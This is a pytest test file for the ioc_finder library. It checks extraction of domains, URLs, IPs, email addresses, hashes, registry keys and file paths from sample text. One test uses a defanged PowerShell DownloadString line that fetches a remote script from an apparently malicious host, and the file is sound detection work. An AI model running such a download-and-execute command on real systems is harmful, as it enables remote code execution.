#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import pytest

from ioc_finder import find_iocs


@pytest.fixture
def text_a():
    """Provide some generic text for the tests below."""
    return 'example.com is a nice domain if you consider http://bad.com/test/bingo.php to be bad. {} {} {} 1.2.3.4 192.64.55.61 bad12312@example.org'.format(
        'a' * 32, 'b' * 40, 'c' * 64
    )


def test_ioc_finder(text_a):
    iocs = find_iocs(text_a)
    assert len(iocs['domains']) == 3
    assert 'example.com' in iocs['domains']
    assert 'example.org' in iocs['domains']
    assert 'bad.com' in iocs['domains']

    assert len(iocs['email_addresses_complete']) == 1
    assert 'bad12312@example.org' in iocs['email_addresses_complete']

    assert len(iocs['ipv4s']) == 2
    assert '1.2.3.4' in iocs['ipv4s']
    assert '192.64.55.61' in iocs['ipv4s']

    assert len(iocs['urls']) == 1
    assert 'http://bad.com/test/bingo.php' in iocs['urls']

    assert len(iocs['md5s']) == 1
    assert 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' in iocs['md5s']

    assert len(iocs['sha1s']) == 1
    assert 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb' in iocs['sha1s']

    assert len(iocs['sha256s']) == 1
    assert 'cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc' in iocs['sha256s']


def test_url_parsing():
    """Test some specific url examples."""
    s = "https://github.com/StylishThemes/GitHub-Dark/blob/master/tools/authors.sh"
    iocs = find_iocs(s)
    assert len(iocs['urls']) == 1
    assert 'https://github.com/StylishThemes/GitHub-Dark/blob/master/tools/authors.sh' in iocs['urls']

    s = '<link href="http://fonts.googleapis.com/css?family=Lato:400,700" rel="stylesheet" type="text/css"/>'
    iocs = find_iocs(s)
    assert 'http://fonts.googleapis.com/css?family=Lato:400,700' in iocs['urls']

    s = '<link href="http://fonts.googleapis.com/css?family=Lato:400,700" rel="stylesheet" type="text/css"/>'
    iocs = find_iocs(s)
    assert 'http://fonts.googleapis.com/css?family=Lato:400,700' in iocs['urls']

    s = '<a href="https://bit.ly/12345#abcd" target="_blank" style="text-decoration:none;;">'
    results = find_iocs(s)
    assert len(results['urls']) == 1
    assert 'https://bit.ly/12345#abcd' in results['urls']

    s = '<a href="https://bit.ly/12345" target="_blank" style="text-decoration:none;;">'
    results = find_iocs(s)
    assert len(results['urls']) == 1
    assert 'https://bit.ly/12345' in results['urls']

    s = '<a href="https://bit.ly" target="_blank" style="text-decoration:none;;">'
    results = find_iocs(s)
    assert len(results['urls']) == 1
    assert 'https://bit.ly' in results['urls']

    s = '<a href="https://bit.ly/" target="_blank" style="text-decoration:none;;">'
    results = find_iocs(s)
    assert len(results['urls']) == 1
    assert 'https://bit.ly/' in results['urls']

    s = 'http://example.com//test'
    results = find_iocs(s)
    assert len(results['urls']) == 1
    assert 'http://example.com//test' in results['urls']


def test_schemeless_url_parsing():
    """Test parsing URLs without a scheme."""
    s = "github.com/StylishThemes/GitHub-Dark/blob/master/tools/authors.sh"
    iocs = find_iocs(s)
    assert len(iocs['urls']) == 1
    assert 'github.com/StylishThemes/GitHub-Dark/blob/master/tools/authors.sh' in iocs['urls']

    s = 'github.com/StylishThemes/GitHub-Dark/blob/master/tools/authors.sh hightower.space/projects'
    iocs = find_iocs(s)
    assert len(iocs['urls']) == 2
    assert 'hightower.space/projects' in iocs['urls']
    assert 'github.com/StylishThemes/GitHub-Dark/blob/master/tools/authors.sh' in iocs['urls']

    s = 'https://github.com/StylishThemes/GitHub-Dark/blob/master/tools/authors.sh hightower.space/projects'
    iocs = find_iocs(s, parse_urls_without_scheme=False)
    assert len(iocs['urls']) == 1
    assert 'https://github.com/StylishThemes/GitHub-Dark/blob/master/tools/authors.sh' in iocs['urls']


def test_address_email_address():
    s = ">test@[192.168.2.1]<"
    iocs = find_iocs(s)
    assert len(iocs['email_addresses_complete']) == 1
    assert 'test@[192.168.2.1]' in iocs['email_addresses_complete']
    assert len(iocs['email_addresses']) == 1
    assert 'test@[192.168.2.1]' in iocs['email_addresses']
    assert len(iocs['ipv4s']) == 1
    assert '192.168.2.1' in iocs['ipv4s']

    s = "bad@[192.168.7.3]"
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 1
    assert '192.168.7.3' in iocs['ipv4s']
    assert len(iocs['email_addresses_complete']) == 1
    assert 'bad@[192.168.7.3]' in iocs['email_addresses_complete']
    assert len(iocs['email_addresses']) == 1
    assert 'bad@[192.168.7.3]' in iocs['email_addresses']

    s = "bad@[192.168.7.3]aaaaa"
    iocs = find_iocs(s)
    assert len(iocs['email_addresses_complete']) == 1
    assert 'bad@[192.168.7.3]' in iocs['email_addresses_complete']
    assert len(iocs['email_addresses']) == 1
    assert 'bad@[192.168.7.3]' in iocs['email_addresses']

    s = "jsmith@[IPv6:2001:db8::1]"
    iocs = find_iocs(s)
    assert len(iocs['email_addresses_complete']) == 1
    assert 'jsmith@[IPv6:2001:db8::1]' in iocs['email_addresses_complete']
    assert len(iocs['email_addresses']) == 1
    assert 'jsmith@[IPv6:2001:db8::1]' in iocs['email_addresses']
    assert len(iocs['ipv6s']) == 1
    assert '2001:db8::1' in iocs['ipv6s']


def test_address_domain_url():
    s = "http://192.64.55.61/test.php"
    iocs = find_iocs(s)
    assert len(iocs['urls']) == 1
    assert 'http://192.64.55.61/test.php' in iocs['urls']
    assert len(iocs['ipv4s']) == 1
    assert '192.64.55.61' in iocs['ipv4s']


def test_url_domain_name_parsing():
    s = "http://foo.youtube/test.php"
    iocs = find_iocs(s)
    assert len(iocs['urls']) == 1
    assert 'http://foo.youtube/test.php' in iocs['urls']
    assert len(iocs['domains']) == 1
    assert 'foo.youtube' in iocs['domains']


def test_unicode_domain_name():
    s = "ȩxample.com"
    iocs = find_iocs(s)
    assert len(iocs['domains']) == 1
    assert '\\u0229xample.com' in iocs['domains']


def test_ioc_deduplication():
    """Make sure the results returned from the ioc_finder are deduplicated."""
    iocs = find_iocs('example.com example.com')
    assert len(iocs['domains']) == 1


def test_file_hash_order():
    s = "{} {}".format('a' * 32, 'b' * 40)
    iocs = find_iocs(s)
    assert iocs['md5s'][0] == 'a' * 32
    assert iocs['sha1s'][0] == 'b' * 40


def test_file_hash_parsing():
    s = 'this is a test{}'.format('a' * 32)
    iocs = find_iocs(s)
    assert len(iocs['md5s']) == 0

    s = 'this is a test {}'.format('a' * 32)
    iocs = find_iocs(s)
    assert len(iocs['md5s']) == 1
    assert iocs['md5s'][0] == 'a' * 32

    s = 'this is a test "{}"'.format('a' * 32)
    iocs = find_iocs(s)
    assert len(iocs['md5s']) == 1
    assert iocs['md5s'][0] == 'a' * 32

    s = 'this is a test {}.'.format('a' * 32)
    iocs = find_iocs(s)
    assert len(iocs['md5s']) == 1
    assert iocs['md5s'][0] == 'a' * 32

    s = '0x1a1db93766e31994507511c9c70a1dd94465cf6d'
    iocs = find_iocs(s)
    assert len(iocs['sha1s']) == 1


def test_url_boundaries():
    """Make sure the boundaries for a url are correct."""
    s = """http://192.168.0.1/test/bad.html</a><br></div>"""
    iocs = find_iocs(s)
    assert iocs['urls'][0] == 'http://192.168.0.1/test/bad.html'
    assert len(iocs['urls']) == 1

    s = """<IMg SRc="https://i.imgur.com/abc.png#4827766048"/><br>
<IMg SRc="https://i.imgur.com/def.png#4827766048"/><br>"""
    iocs = find_iocs(s)
    assert 'https://i.imgur.com/abc.png#4827766048' in iocs['urls']
    assert 'https://i.imgur.com/def.png#4827766048' in iocs['urls']
    assert len(iocs['urls']) == 2

    s = """<IMg SRc="https://i.imgur.com/abc.png"/><br>"""
    iocs = find_iocs(s)
    assert 'https://i.imgur.com/abc.png' in iocs['urls']
    assert len(iocs['urls']) == 1

    s = """(https://i.imgur.com/abc.png)"""
    iocs = find_iocs(s)
    assert 'https://i.imgur.com/abc.png' in iocs['urls']
    assert len(iocs['urls']) == 1

    s = """(https://i.imgur.com/abc.png#abc)"""
    iocs = find_iocs(s)
    assert 'https://i.imgur.com/abc.png#abc' in iocs['urls']
    assert len(iocs['urls']) == 1

    s = """[https://i.imgur.com/abc.png](https://i.imgur.com/abc.png)"""
    iocs = find_iocs(s)
    assert 'https://i.imgur.com/abc.png' in iocs['urls']
    assert len(iocs['urls']) == 1

    s = """[https://i.imgur.com/abc.png#abc](https://i.imgur.com/abc.png#abc)"""
    iocs = find_iocs(s)
    assert 'https://i.imgur.com/abc.png#abc' in iocs['urls']
    assert len(iocs['urls']) == 1

    s = "DownloadString('https://hacks4all[.]net/rdp.ps1');g $I"
    iocs = find_iocs(s)
    assert 'https://hacks4all.net/rdp.ps1' in iocs['urls']
    assert len(iocs['urls']) == 1

    s = 'DownloadString("https://hacks4all[.]net/rdp.ps1");g $I'
    iocs = find_iocs(s)
    assert 'https://hacks4all.net/rdp.ps1' in iocs['urls']
    assert len(iocs['urls']) == 1


def test_domain_parsing():
    s = "Host: dfasdfa (mz-fcb301p.ocn.ad.jp asdfsdafs"
    iocs = find_iocs(s)
    assert iocs['domains'][0] == 'mz-fcb301p.ocn.ad.jp'
    assert len(iocs['domains']) == 1

    s = "smtp.mailfrom"
    iocs = find_iocs(s)
    assert len(iocs['domains']) == 0

    s = "bar.com"
    iocs = find_iocs(s)
    assert len(iocs['domains']) == 1
    assert iocs['domains'][0] == 'bar.com'

    s = 'bar.com"'
    iocs = find_iocs(s)
    assert len(iocs['domains']) == 1
    assert iocs['domains'][0] == 'bar.com'

    s = "bar.com'"
    iocs = find_iocs(s)
    assert len(iocs['domains']) == 1
    assert iocs['domains'][0] == 'bar.com'

    s = "bar.com."
    iocs = find_iocs(s)
    assert len(iocs['domains']) == 1
    assert iocs['domains'][0] == 'bar.com'


def test_email_address_parsing():
    s = 'my email is: foo"bar@gmail.com'
    iocs = find_iocs(s)
    assert iocs['email_addresses_complete'][0] == 'foo"bar@gmail.com'
    assert len(iocs['email_addresses_complete']) == 1
    assert iocs['email_addresses'][0] == 'bar@gmail.com'
    assert len(iocs['email_addresses']) == 1

    s = 'foobar@gmail.com"'
    iocs = find_iocs(s)
    assert iocs['email_addresses_complete'][0] == 'foobar@gmail.com'
    assert len(iocs['email_addresses_complete']) == 1
    assert iocs['email_addresses'][0] == 'foobar@gmail.com'
    assert len(iocs['email_addresses']) == 1

    s = 'foobar@gmail.comahhhhhhhh'
    iocs = find_iocs(s)
    assert len(iocs['email_addresses_complete']) == 0
    assert len(iocs['email_addresses']) == 0

    s = '"foobar@gmail.com'
    iocs = find_iocs(s)
    assert len(iocs['email_addresses_complete']) == 1
    assert iocs['email_addresses_complete'][0] == '"foobar@gmail.com'
    assert len(iocs['email_addresses']) == 1
    assert iocs['email_addresses'][0] == 'foobar@gmail.com'

    s = 'smtp.mailfrom=example@example.com'
    iocs = find_iocs(s)
    assert len(iocs['email_addresses_complete']) == 1
    assert iocs['email_addresses_complete'][0] == 'smtp.mailfrom=example@example.com'
    assert len(iocs['email_addresses']) == 1
    assert iocs['email_addresses'][0] == 'example@example.com'

    s = '"foo@bar.com"'
    iocs = find_iocs(s)
    assert len(iocs['email_addresses_complete']) == 1
    assert iocs['email_addresses_complete'][0] == '"foo@bar.com'
    assert len(iocs['email_addresses']) == 1
    assert iocs['email_addresses'][0] == 'foo@bar.com'

    # making sure that the `parse_domain_from_email_address` argument is working properly
    s = 'foo@bar.com.'
    iocs = find_iocs(s, parse_domain_from_email_address=False)
    assert len(iocs['email_addresses']) == 1
    assert iocs['email_addresses'][0] == 'foo@bar.com'
    assert len(iocs['domains']) == 0

    s = '"foo@bar.com'
    iocs = find_iocs(s)
    assert len(iocs['email_addresses']) == 1
    assert iocs['email_addresses'][0] == 'foo@bar.com'

    # validating https://github.com/fhightower/ioc-finder/issues/40 is fixed
    s = '-----foo@bar.com'
    iocs = find_iocs(s)
    assert len(iocs['email_addresses']) == 1
    assert iocs['email_addresses'][0] == 'foo@bar.com'

    s = 'foo-burt@bar.com f-1@bar.com'
    iocs = find_iocs(s)
    assert len(iocs['email_addresses']) == 2
    assert 'foo-burt@bar.com' in iocs['email_addresses']
    assert 'f-1@bar.com' in iocs['email_addresses']


def test_erroneous_ip_address_parsing():
    # the two tests below make sure that IP addresses are not parsed from strings with decimals in them
    s = '2018.12.15.14.05.43'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0

    s = '111.12.15.14.05.43'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0

    s = '.18.12.15.14'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0

    s = '18.12.15.1411111111'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0

    s = '018.12.15.14'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 1

    s = '18.12.15.14.'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 1

    # the three tests below make sure that IP addresses are not parsed from sequences with large numbers in them
    s = '1112.15.14.05'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0

    s = '15.1112.14.05'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0

    s = '15.14.05.1112'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0


def test_ip_address_systematically():
    s = '1.1.1.1'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 1

    s = '.1.1.1.1'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0

    # I would like to match in this situation to capture ip address that are in a sentence
    s = '1.1.1.1.'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 1

    s = '.1.1.1.1.'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0

    s = '1.1.1.1.1'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0

    s = '.1.1.1.1.1'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0

    s = '1.1.1.1.1.'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0

    s = '.1.1.1.1.1.'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0

    s = '1.1.1.1.1.1'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0

    s = '1.1.1.1.a'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0

    s = '1.01.1.1'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 1
    assert '1.1.1.1' in iocs['ipv4s']

    s = '01.1.1.1'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 1
    assert '1.1.1.1' in iocs['ipv4s']

    s = '01.01.1.1'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 1
    assert '1.1.1.1' in iocs['ipv4s']

    s = '0001.1.1.1'
    iocs = find_iocs(s)
    assert len(iocs['ipv4s']) == 0


def test_asn_parsing():
    s = 'NWD2HUBCAS8.ad.analog.com'
    iocs = find_iocs(s)
    assert len(iocs['asns']) == 0

    s = 'here is an asn: "AS8"'
    iocs = find_iocs(s)
    assert len(iocs['asns']) == 1
    assert iocs['asns'][0] == 'ASN8'

    s = 'here is an asn: AS8foobar'
    iocs = find_iocs(s)
    assert len(iocs['asns']) == 0

    s = 'as8'
    iocs = find_iocs(s)
    assert len(iocs['asns']) == 1
    assert iocs['asns'][0] == 'ASN8'


def test_onion_parsing():
    s = 'foo.onion'
    iocs = find_iocs(s)
    assert len(iocs['domains']) == 1
    assert 'foo.onion' in iocs['domains']

    s = 'http://foo.onion/test'
    iocs = find_iocs(s)
    assert len(iocs['domains']) == 1
    assert len(iocs['urls']) == 1
    assert 'http://foo.onion/test' in iocs['urls']
    assert 'foo.onion' in iocs['domains']


def test_registry_key_abbreviations():
    s = """<HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\EXPLORER\ADVANCED
Value Name: ShowSuperHidden
<HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\EXPLORER\ADVANCED
Value Name: HideFileExt
<HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\EXPLORER\ADVANCED
Value Name: SuperHidden
<HKLM>\SOFTWARE\WOW6432NODE\MICROSOFT\WINDOWS\CURRENTVERSION\EXPLORER\ADVANCED\FOLDER\HIDEFILEEXT
Value Name: DefaultValue
<HKLM>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\EXPLORER\RUN
Value Name: PC
<HKLM>\SOFTWARE\WOW6432NODE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
Value Name: avscan"""

    iocs = find_iocs(s)
    assert len(iocs['registry_key_paths']) == 4
    assert 'HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\EXPLORER\ADVANCED' in iocs['registry_key_paths']
    assert (
        'HKLM\SOFTWARE\WOW6432NODE\MICROSOFT\WINDOWS\CURRENTVERSION\EXPLORER\ADVANCED\FOLDER\HIDEFILEEXT'
        in iocs['registry_key_paths']
    )
    assert 'HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\EXPLORER\RUN' in iocs['registry_key_paths']
    assert 'HKLM\SOFTWARE\WOW6432NODE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN' in iocs['registry_key_paths']


def test_issue_46_registry_key_with_space_parsing():
    """Make sure that Registry Keys with a space in them are parsed properly. See: https://github.com/fhightower/ioc-finder/issues/46."""
    s = """HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Console\ConsoleIME"""
    iocs = find_iocs(s)
    assert len(iocs['registry_key_paths']) == 1
    assert iocs['registry_key_paths'][0] == 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Console\ConsoleIME'

    s = """HKLM\SOFTWARE\Microsoft\Windows  NT\CurrentVersion\Console\ConsoleIME"""
    iocs = find_iocs(s)
    assert len(iocs['registry_key_paths']) == 1
    assert iocs['registry_key_paths'][0] == 'HKLM\SOFTWARE\Microsoft\Windows'

    s = """HKLM\SOFTWARE\Microsoft\Windows ... NT\CurrentVersion\Console\ConsoleIME"""
    iocs = find_iocs(s)
    assert len(iocs['registry_key_paths']) == 1
    assert iocs['registry_key_paths'][0] == 'HKLM\SOFTWARE\Microsoft\Windows'

    s = """Found a registry key like <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\EXPLORER\ADVANCED on the windows box"""
    iocs = find_iocs(s)
    assert len(iocs['registry_key_paths']) == 1
    assert iocs['registry_key_paths'][0] == 'HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\EXPLORER\ADVANCED'

    s = """Found a registry key like HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Console\ConsoleIME on the windows box"""
    iocs = find_iocs(s)
    assert len(iocs['registry_key_paths']) == 1
    assert iocs['registry_key_paths'][0] == 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Console\ConsoleIME'


def test_deduplication_of_indicators_with_different_cases():
    s = 'example.com Example.com exAmplE.com'
    iocs = find_iocs(s)
    assert len(iocs['domains']) == 1
    assert iocs['domains'][0] == 'example.com'

    s = 'bad@example.com bad@Example.com bad@exAmplE.com'
    iocs = find_iocs(s)
    assert len(iocs['email_addresses']) == 1
    assert iocs['email_addresses'][0] == 'bad@example.com'

    s = 'bad@example.com Bad@example.com'
    iocs = find_iocs(s)
    assert len(iocs['email_addresses']) == 1
    assert 'bad@example.com' in iocs['email_addresses']

    s = 'http://example.com/test http://EXAMple.com/test'
    iocs = find_iocs(s)
    assert len(iocs['urls']) == 1
    assert iocs['urls'][0] == 'http://example.com/test'

    s = 'http://example.com/test http://EXAMple.com/TEST'
    iocs = find_iocs(s)
    assert len(iocs['urls']) == 2
    assert 'http://example.com/test' in iocs['urls']
    assert 'http://example.com/TEST' in iocs['urls']


def test_google_adsense_publisher_ids():
    s = "PUB-1234567891234567"
    iocs = find_iocs(s)
    assert len(iocs['google_adsense_publisher_ids']) == 1
    assert iocs['google_adsense_publisher_ids'][0] == 'pub-1234567891234567'

    s = "pUb-1234567891234567"
    iocs = find_iocs(s)
    assert len(iocs['google_adsense_publisher_ids']) == 0


def test_google_analyitics_tracker_ids():
    s = "ua-000000-1"
    iocs = find_iocs(s)
    assert len(iocs['google_analytics_tracker_ids']) == 1
    assert iocs['google_analytics_tracker_ids'][0] == 'UA-000000-1'


def test_google_casing_deduplication():
    s = "pub-1234567891234567 PUB-1234567891234567 pUb-1234567891234567"
    iocs = find_iocs(s)
    assert len(iocs['google_adsense_publisher_ids']) == 1
    assert iocs['google_adsense_publisher_ids'][0] == 'pub-1234567891234567'

    s = "UA-000000-1 ua-000000-1"
    iocs = find_iocs(s)
    assert len(iocs['google_analytics_tracker_ids']) == 1
    assert iocs['google_analytics_tracker_ids'][0] == 'UA-000000-1'


def test_not_parsing_imphash():
    s = 'imphash 18ddf28a71089acdbab5038f58044c0a'
    iocs = find_iocs(s, parse_imphashes=False)
    assert 'imphashes' not in iocs
    assert len(iocs['md5s']) == 1


def test_not_parsing_authentihash():
    s = 'authentihash 3f1b149d07e7e8636636b8b7f7043c40ed64a10b28986181fb046c498432c2d4'
    iocs = find_iocs(s, parse_authentihashes=False)
    assert 'authentihashes' not in iocs
    assert len(iocs['sha256s']) == 1


def test_mac_address_parsing():
    s = '2019.02.15'
    iocs = find_iocs(s)
    assert len(iocs['mac_addresses']) == 0


def test_windows_file_paths():
    s = r'test C:\Users\<username>\AppData\Roaming\Macromedia\Flash Player\macromedia\bin is a bad file path'
    iocs = find_iocs(s)
    assert len(iocs['file_paths']) == 1
    assert iocs['file_paths'][0] == r'C:\Users\<username>\AppData\Roaming\Macromedia\Flash Player\macromedia\bin'

    s = r'test C:\Users\<username>\AppData\Roaming\Macromedia\Flash Player\macromedia\bin\ is a bad file path'
    iocs = find_iocs(s)
    assert len(iocs['file_paths']) == 1
    assert iocs['file_paths'][0] == 'C:\\Users\\<username>\\AppData\\Roaming\\Macromedia\\Flash Player\\macromedia\\bin\\'


def test_unix_file_paths():
    # https://github.com/fhightower/ioc-finder/issues/42
    s = 'https://twitter.com/'
    iocs = find_iocs(s)
    assert len(iocs['file_paths']) == 0

    s = r'test /Library/Storage/File System/HFS/25cf5d02-e50b-4288-870a-528d56c3cf6e file'
    iocs = find_iocs(s)
    assert len(iocs['file_paths']) == 1
    assert iocs['file_paths'][0] == r'/Library/Storage/File System/HFS/25cf5d02-e50b-4288-870a-528d56c3cf6e'

    s = r'test /Library/Storage/File System/HFS/25cf5d02-e50b-4288-870a-528d56c3cf6e/ file'
    iocs = find_iocs(s)
    assert len(iocs['file_paths']) == 1
    assert iocs['file_paths'][0] == r'/Library/Storage/File System/HFS/25cf5d02-e50b-4288-870a-528d56c3cf6e/'


def test_phone_number_parsing():
    # https://github.com/fhightower/ioc-finder/issues/43
    s = '3-2-1 0.02'
    iocs = find_iocs(s)
    assert len(iocs['phone_numbers']) == 0


def test_ipv6_parsing():
    # https://github.com/fhightower/ioc-finder/issues/37
    s = '11:04:10 -0500'
    iocs = find_iocs(s)
    assert len(iocs['ipv6s']) == 0


def test_ssdeep_parsing():
    # https://github.com/fhightower/ioc-finder/issues/36
    s = '11:04:10 -0500'
    iocs = find_iocs(s)
    assert len(iocs['ssdeeps']) == 0
